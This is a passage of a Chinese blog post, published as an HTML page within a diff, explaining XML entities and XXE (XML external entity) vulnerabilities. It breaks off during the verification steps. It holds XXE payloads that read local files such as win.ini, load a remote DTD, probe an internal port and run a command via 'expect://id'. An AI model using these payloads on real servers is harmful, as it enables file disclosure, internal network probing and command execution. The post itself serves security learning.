@@ -1,0 +1,2015 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>XXE漏洞 - 剑胆琴心</title><meta name="author" content="剑胆琴心">
+<meta name="author-link" content="http://shuai06.github.io">
+<meta name="description" content="虽然然XXE漏洞很基础，但是很久不用掌握的也不太好，所以借此机会重新复习一下 XML XML全称“可扩展标记语言”（extensible markup langu" /><meta name="keywords" content='XXE, 代码审计' />
+  <meta itemprop="name" content="XXE漏洞">
+  <meta itemprop="description" content="虽然然XXE漏洞很基础，但是很久不用掌握的也不太好，所以借此机会重新复习一下 XML XML全称“可扩展标记语言”（extensible markup langu">
+  <meta itemprop="datePublished" content="2024-07-05T21:55:45+08:00">
+  <meta itemprop="dateModified" content="2024-07-05T14:00:50+00:00">
+  <meta itemprop="wordCount" content="7566">
+  <meta itemprop="image" content="https://shuai06.github.io/logo.png">
+  <meta itemprop="keywords" content="XXE,代码审计"><meta property="og:url" content="https://shuai06.github.io/xxe%E6%BC%8F%E6%B4%9E/">
+  <meta property="og:site_name" content="剑胆琴心">
+  <meta property="og:title" content="XXE漏洞">
+  <meta property="og:description" content="虽然然XXE漏洞很基础，但是很久不用掌握的也不太好，所以借此机会重新复习一下 XML XML全称“可扩展标记语言”（extensible markup langu">
+  <meta property="og:locale" content="zh_CN">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-07-05T21:55:45+08:00">
+    <meta property="article:modified_time" content="2024-07-05T14:00:50+00:00">
+    <meta property="article:tag" content="XXE">
+    <meta property="article:tag" content="代码审计">
+    <meta property="og:image" content="https://shuai06.github.io/logo.png">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="https://shuai06.github.io/logo.png">
+  <meta name="twitter:title" content="XXE漏洞">
+  <meta name="twitter:description" content="虽然然XXE漏洞很基础，但是很久不用掌握的也不太好，所以借此机会重新复习一下 XML XML全称“可扩展标记语言”（extensible markup langu">
+<meta name="application-name" content="剑胆琴心">
+<meta name="apple-mobile-web-app-title" content="剑胆琴心"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://shuai06.github.io/xxe%E6%BC%8F%E6%B4%9E/" /><link rel="prev" href="https://shuai06.github.io/commonscollections6%E5%88%A9%E7%94%A8%E9%93%BE%E5%AD%A6%E4%B9%A0/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "XXE漏洞",
+    "inLanguage": "zh-CN",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/shuai06.github.io\/xxe%E6%BC%8F%E6%B4%9E\/"
+    },"image": [{
+              "@type": "ImageObject",
+              "url": "https:\/\/shuai06.github.io\/images\/Apple-Devices-Preview.jpg",
+              "width":  1842 ,
+              "height":  1036 
+            }],"genre": "posts","keywords": "XXE, 代码审计","wordcount":  7566 ,
+    "url": "https:\/\/shuai06.github.io\/xxe%E6%BC%8F%E6%B4%9E\/","datePublished": "2024-07-05T21:55:45+08:00","dateModified": "2024-07-05T14:00:50+00:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+      "@type": "Organization",
+      "name": "剑胆琴心","logo": {
+          "@type": "ImageObject",
+          "url": "https:\/\/shuai06.github.io\/images\/avatar.png",
+          "width":  438 ,
+          "height":  438 
+        }},"author": {
+        "@type": "Person",
+        "name": "剑胆琴心"
+      },"description": ""
+  }
+  </script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('light' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'light' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="剑胆琴心"><img
+    class="lazyload logo"
+    src="/svg/loading.min.svg"
+    data-src="/images/avatar.png"
+    data-srcset="/images/avatar.png, /images/avatar.png 1.5x, /images/avatar.png 2x"
+    data-sizes="auto"
+    alt="剑胆琴心"
+    title="剑胆琴心" width="438" height="438"/><span class="header-title-text">剑胆琴心</span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/posts/"
+                
+                
+              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 所有文章</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/categories/"
+                
+                
+              ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tags/"
+                
+                
+              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/friends/"
+                title="友情链接"
+                
+              ><i class="fa-solid fa-users fa-fw fa-sm" aria-hidden="true"></i> 友链</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ><i class="fa-solid fa-info-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="搜索文章标题或内容 ..." id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" title="切换主题">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li>
+      </ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="剑胆琴心"><img
+    class="lazyload logo"
+    src="/svg/loading.min.svg"
+    data-src="/images/avatar.png"
+    data-srcset="/images/avatar.png, /images/avatar.png 1.5x, /images/avatar.png 2x"
+    data-sizes="auto"
+    alt="/images/avatar.png"
+    title="/images/avatar.png" width="438" height="438"/><span class="header-title-text">剑胆琴心</span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="搜索文章标题或内容 ..." id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              取消
+            </a>
+          </li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/posts/"
+                  
+                  
+                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 所有文章</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/categories/"
+                  
+                  
+                ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tags/"
+                  
+                  
+                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/friends/"
+                  title="友情链接"
+                  
+                ><i class="fa-solid fa-users fa-fw fa-sm" aria-hidden="true"></i> 友链</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ><i class="fa-solid fa-info-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li
+              class="menu-item text-center"
+            ><a
+                  class="menu-link"
+                  href="https://github.com/shuai06"
+                  title="GitHub"
+                  rel="noopener noreferrer" target="_blank"
+                ><i class='fa-brands fa-github fa-fw' aria-hidden='true'></i> </a></li><li class="menu-item theme-switch" title="切换主题">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><main class="container" data-page-style="normal"><aside class="toc" id="toc-auto"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside>
+
+  <aside class="aside-custom">
+    </aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX">
+        <span>XXE漏洞</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><a href="http://shuai06.github.io" title="作者"target="_blank" rel="external nofollow noopener noreferrer author" class="author"><img
+    class="lazyload avatar"
+    src="/svg/loading.min.svg"
+    data-src="/images/avatar.png"
+    data-srcset="/images/avatar.png, /images/avatar.png 1.5x, /images/avatar.png 2x"
+    data-sizes="auto"
+    alt="剑胆琴心"
+    title="剑胆琴心" width="438" height="438"/>&nbsp;剑胆琴心</a></span>
+          <span class="post-category">收录于 <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 渗透测试</a></span></div>
+      <div class="post-meta-line"><span title=2024-07-05&#32;21:55:45><i class="fa-regular fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2024-07-05">2024-07-05</time></span>&nbsp;<span><i class="fa-solid fa-pencil-alt fa-fw" aria-hidden="true"></i> 约 7566 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw" aria-hidden="true"></i> 预计阅读 16 分钟</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>目录</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#xml">XML</a>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#xml文档结构">XML文档结构</a></li>
+            <li><a href="#dtd">DTD</a></li>
+            <li><a href="#实体">实体</a>
+              <ul>
+                <li><a href="#1内部实体">1.内部实体</a></li>
+                <li><a href="#2外部实体">2.外部实体</a></li>
+                <li><a href="#1通用实体">1.通用实体</a></li>
+                <li><a href="#2参数实体">2.参数实体</a></li>
+              </ul>
+            </li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#xxe简介">XXE简介</a></li>
+    <li><a href="#xxe危害">XXE危害</a>
+      <ul>
+        <li><a href="#漏洞验证思路">漏洞验证思路</a>
+          <ul>
+            <li><a href="#1检测xml是否会被成功解析以及是否支持dtd引用外部实体">1.<strong>检测XML是否会被成功解析以及是否支持DTD引用外部实体</strong></a></li>
+            <li><a href="#2测试是否支持解析普通实体"><strong>2.测试是否支持解析普通实体</strong></a></li>
+            <li><a href="#3测试是否支持解析参数实体"><strong>3.测试是否支持解析参数实体</strong></a></li>
+            <li><a href="#4测试是否支持解析外部实体"><strong>4.测试是否支持解析外部实体：</strong></a></li>
+          </ul>
+        </li>
+        <li><a href="#有回显读取本地文件norm-xxe">有回显读取本地文件(Norm XXE)</a></li>
+        <li><a href="#使用-netdoc-的-xxe-攻击">使用 netdoc 的 XXE 攻击</a></li>
+        <li><a href="#oob-xxe">OOB XXE</a></li>
+        <li><a href="#请求dnslog">请求DNSLog</a></li>
+        <li><a href="#执行系统命令">执行系统命令</a></li>
+        <li><a href="#探测内网">探测内网</a></li>
+        <li><a href="#文件上传">文件上传</a></li>
+        <li><a href="#dos-攻击">DoS 攻击</a></li>
+        <li><a href="#其他payload">其他payload</a></li>
+      </ul>
+    </li>
+    <li><a href="#代码审计">代码审计</a>
+      <ul>
+        <li><a href="#xml的常见接口">XML的常见接口</a>
+          <ul>
+            <li><a href="#1xmlreader">1.XMLReader</a></li>
+            <li><a href="#2saxbuilder">2.SAXBuilder</a></li>
+            <li><a href="#3saxreader">3.SAXReader</a></li>
+            <li><a href="#4saxparserfactory">4.SAXParserFactory</a></li>
+            <li><a href="#5digester">5.Digester</a></li>
+            <li><a href="#6documentbuiderfactory">6.DocumentBuiderFactory</a></li>
+            <li><a href="#7saxtransformer">7.SAXTransformer</a></li>
+            <li><a href="#8schema">8.Schema</a></li>
+            <li><a href="#9transformer">9.Transformer</a></li>
+            <li><a href="#10unmarshaller">10.Unmarshaller</a></li>
+            <li><a href="#11validatorsample">11.ValidatorSample</a></li>
+          </ul>
+        </li>
+        <li><a href="#挖掘技巧">挖掘技巧</a></li>
+        <li><a href="#审计关键字">审计关键字</a></li>
+        <li><a href="#例子">例子</a></li>
+      </ul>
+    </li>
+    <li><a href="#漏洞防御">漏洞防御</a></li>
+    <li><a href="#参考文章">参考文章</a></li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><blockquote>
+<p>虽然然XXE漏洞很基础，但是很久不用掌握的也不太好，所以借此机会重新复习一下</p>
+</blockquote>
+<h2 id="xml">XML</h2>
+<p>XML全称“可扩展标记语言”（extensible markup language），XML是一种用于存储和传输数据的语言。它用于配置文件，文档格式（如OOXML，ODF，PDF，RSS，&hellip;），图像格式（SVG，EXIF标题）和网络协议（WebDAV，CalDAV，XMLRPC，SOAP，XMPP，SAML， XACML，&hellip;）与HTML一样，XML使用标签和数据的树状结构。但不同的是，XML不使用预定义标记，因此可以为标记指定描述数据的名称。由于json的出现，xml的受欢迎程度大大下降。</p>
+<h4 id="xml文档结构">XML文档结构</h4>
+<p>包括：<code>XML声明+DTD文档类型定义+文档元素</code>，例如：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"> &lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;   //xml的声明  
+</span></span><span class="line"><span class="cl"> &lt;!DOCTYPE foo [ 
+</span></span><span class="line"><span class="cl"> &lt;!ELEMENT foo ANY &gt;
+</span></span><span class="line"><span class="cl"> &lt;!ENTITY xxe SYSTEM &#34;file://d:/1.txt&#34; &gt;
+</span></span><span class="line"><span class="cl"> ]&gt;                                      //DTD部分
+</span></span><span class="line"><span class="cl">&lt;x&gt;&amp;xxe;&lt;/x&gt;                          //xml文档部分
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="dtd">DTD</h4>
+<p>XML 文档有自己的一个格式规范，这个格式规范就是DTD（document type definition）即文档类型定义，用于定义XML文档的结构，它作为xml文件的一部分位于XML声明和文档元素之间，比如：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?xml version=&#34;1.0&#34;?&gt;//这一行是 XML 文档定义
+</span></span><span class="line"><span class="cl">&lt;!DOCTYPE message [
+</span></span><span class="line"><span class="cl">&lt;!ELEMENT message (receiver ,sender ,header ,msg)&gt;
+</span></span><span class="line"><span class="cl">&lt;!ELEMENT receiver (#PCDATA)&gt;
+</span></span><span class="line"><span class="cl">&lt;!ELEMENT sender (#PCDATA)&gt;
+</span></span><span class="line"><span class="cl">&lt;!ELEMENT header (#PCDATA)&gt;
+</span></span><span class="line"><span class="cl">&lt;!ELEMENT msg (#PCDATA)&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>它就定义了 XML 的根元素必须是message，根元素下面有一些子元素，所以 XML必须像下面这么写：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;message&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;receiver&gt;</span>Myself<span class="nt">&lt;/receiver&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;sender&gt;</span>Someone<span class="nt">&lt;/sender&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;header&gt;</span>TheReminder<span class="nt">&lt;/header&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;msg&gt;</span>This is an amazing book<span class="nt">&lt;/msg&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/message&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>DTD需要在<code>!DOCTYPE</code>注释中定义根元素，而后在中括号的<code>[]</code>内使用！<code>ELEMENT</code>注释定义各元素特征。</p>
+<h4 id="实体">实体</h4>
+<p>如：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?xml version = &#34;1.0&#34;?&gt;
+</span></span><span class="line"><span class="cl">&lt;!DOCTYPE fool [
+</span></span><span class="line"><span class="cl">	&lt;!ELEMENT fool ANY&gt;
+</span></span><span class="line"><span class="cl">    &lt;!ENTITY xxe &#34;test&#34;&gt;
+</span></span><span class="line"><span class="cl">]&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>它规定了xml文件的根元素是foo，但<code>ANY</code>说明<strong>接受任何元素</strong>。重点是<code>!ENTITY</code>，这就是我们要提到的<strong>实体</strong>，<strong>实体本质是定义了一个变量</strong>，变量名<code>xxe</code>，值为“test”，后面在 XML 中<strong>通过 &amp; 符号进行引用</strong>，所以根据DTD我们写出下面的xml文件：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;login&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;user&gt;</span><span class="err">&amp;</span>xxe/user&gt;
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;pass&gt;&lt;/pass&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/login&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>因为ANY的属性，元素我们可以随意命令，但user值通过&amp;xxe，实际值为test。</p>
+<p>我们使用 &amp;xxe 对 上面定义的 xxe 实体进行了引用，到时候输出的时候 <code>&amp;xxe</code> 就会被 <code>&quot;test&quot; </code>替换。</p>
+<p>重点来了，实体分为两种，内部实体和<strong>外部实体</strong></p>
+<h5 id="1内部实体">1.内部实体</h5>
+<p>上面的例子就是<strong>内部实</strong>体。</p>
+<h5 id="2外部实体">2.外部实体</h5>
+<p>但是实体实际上可以从外部的dtd文件中引用</p>
+<p>XML<strong>外部实体</strong>是一种自定义实体，<strong>定义位于声明它们的DTD之外</strong>，声明使用<code>SYSTEM</code>关键字，比如：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?xml version=&#34;1.0&#34; encoding=&#34;ISO-8859-1&#34;?&gt;
+</span></span><span class="line"><span class="cl">&lt;!DOCTYPE foo [
+</span></span><span class="line"><span class="cl">&lt;!ELEMENT foo ANY &gt;
+</span></span><span class="line"><span class="cl">&lt;!ENTITY xxe SYSTEM &#34;file:///c:/test.dtd&#34; &gt;]&gt;
+</span></span><span class="line"><span class="cl">&lt;creds&gt;
+</span></span><span class="line"><span class="cl">    &lt;user&gt;&amp;xxe;&lt;/user&gt;
+</span></span><span class="line"><span class="cl">    &lt;pass&gt;mypass&lt;/pass&gt;
+</span></span><span class="line"><span class="cl">&lt;/creds&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>还有一种引用方式是引用<strong>公用 DTD</strong> 的方法，语法如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;!DOCTYPE 根元素名称 PUBLIC “DTD标识名” “公用DTD的URI”&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这个在我们的攻击中也可以起到和 SYSTEM 一样的作用</p>
+<p>上面已经将实体分成了两个派别（内部实体和外部外部），但从另一个角度看，实体也可以分成两个派别（通用实体和参数实体）</p>
+<h5 id="1通用实体">1.通用实体</h5>
+<p>用 <code>&amp;实体名;</code> 引用的实体，他<strong>在DTD 中定义，在 XML 文档中引用</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt; 
+</span></span><span class="line"><span class="cl">&lt;!DOCTYPE updateProfile [&lt;!ENTITY file SYSTEM &#34;file:///c:/windows/win.ini&#34;&gt; ]&gt; 
+</span></span><span class="line"><span class="cl">&lt;updateProfile&gt;  
+</span></span><span class="line"><span class="cl">    &lt;firstname&gt;Joe&lt;/firstname&gt;  
+</span></span><span class="line"><span class="cl">    &lt;lastname&gt;&amp;file;&lt;/lastname&gt;  
+</span></span><span class="line"><span class="cl">    ... 
+</span></span><span class="line"><span class="cl">&lt;/updateProfile&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h5 id="2参数实体">2.参数实体</h5>
+<p>(1) 使用 <code>% 实体名</code>(<strong>这里面空格不能少</strong>) 在 DTD 中定义，并且<strong>只能在 DTD 中使用 <code>%实体名;</code> 引用</strong>
+(2) 只有在 DTD 文件中，参数实体的声明才能引用其他实体
+(3) 和通用实体一样，参数实体也可以外部引用</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;!ENTITY % an-element &#34;&lt;!ELEMENT mytag (subtag)&gt;&#34;&gt; 
+</span></span><span class="line"><span class="cl">&lt;!ENTITY % remote-dtd SYSTEM &#34;http://somewhere.example.org/remote.dtd&#34;&gt; 
+</span></span><span class="line"><span class="cl">%an-element; %remote-dtd;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p>参数实体在Blind XXE 中起到了至关重要的作用</p>
+</blockquote>
+<h2 id="xxe简介">XXE简介</h2>
+<p>XML<strong>外部实体注入漏洞</strong>也叫作XXE（XML External Entity）漏洞，是一种常见的Web应用安全漏洞，可能导致敏感信息泄露、远程代码执行等安全问题。</p>
+<p>当<strong>应用程序使用XML处理器解析外部XML实体时，可能会发生XXE漏洞</strong>。</p>
+<p><strong>外部XML实体</strong>是指<strong>定义在XML文档外部的实体，它可以引用外部文件或资源</strong>。如果XML处理器没有正确配置，它可能会解析这些外部实体，并将外部文件或资源的内容包含到XML文档中。</p>
+<p>那么，前面说的<strong>外部实体</strong>究竟能干什么？</p>
+<h2 id="xxe危害">XXE危害</h2>
+<p>根据有无回显可分为有回显XXE和Blind XXE</p>
+<p><strong>危害：</strong></p>
+<ul>
+<li>
+<p>任意文件读取</p>
+<ul>
+<li>有回显读取本地文件（normal XXE）</li>
+<li>无回显读取本地文件（Blind OOB XXE，数据外带）</li>
+</ul>
+</li>
+<li>
+<p>内网探测：如<code> &lt;!ENTITY xxe SYSTEM &quot;http://127.0.0.1:8080&quot; &gt;探测端口；</code></p>
+<ul>
+<li>HTTP内网主机探测</li>
+<li>内网端口探测</li>
+</ul>
+</li>
+<li>
+<p>攻击内网站点</p>
+</li>
+<li>
+<p>文件上传(使用<code>jar://</code>)</p>
+</li>
+<li>
+<p>命令执行：<code>&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot; &gt;执行命令；</code></p>
+</li>
+<li>
+<p>DOS攻击</p>
+</li>
+<li>
+<p>&hellip;&hellip;.</p>
+</li>
+</ul>
+<h3 id="漏洞验证思路">漏洞验证思路</h3>
+<p>关注可能解析xml格式数据的功能处，较容易发现的是请求包参数包含XML格式数据，不容易发现的是文件上传及数据解析功能处，通过改请求方式、请求头Content-Type等方式进行挖掘。</p>
+<p>步骤：</p>
+<h4 id="1检测xml是否会被成功解析以及是否支持dtd引用外部实体">1.<strong>检测XML是否会被成功解析以及是否支持DTD引用外部实体</strong></h4>
+<p>使用如下xml内容(主要添加了DTD即<code>DOCTYPE</code>)：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE foo&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;user&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;name&gt;</span>Mi1k7ea<span class="nt">&lt;/name&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;sex&gt;</span>male<span class="nt">&lt;/sex&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;age&gt;</span>20<span class="nt">&lt;/age&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/user&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p>注意：当进行的是黑盒测试时，<strong>未返回Error不代表就是可以解析XML</strong>，但返回Error就肯定是不支持解析该XML，原因是服务端可能对Error进行了封装</p>
+</blockquote>
+<h4 id="2测试是否支持解析普通实体"><strong>2.测试是否支持解析普通实体</strong></h4>
+<p>修改xml内容如下，主要添加<code>ELEMENT</code>：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
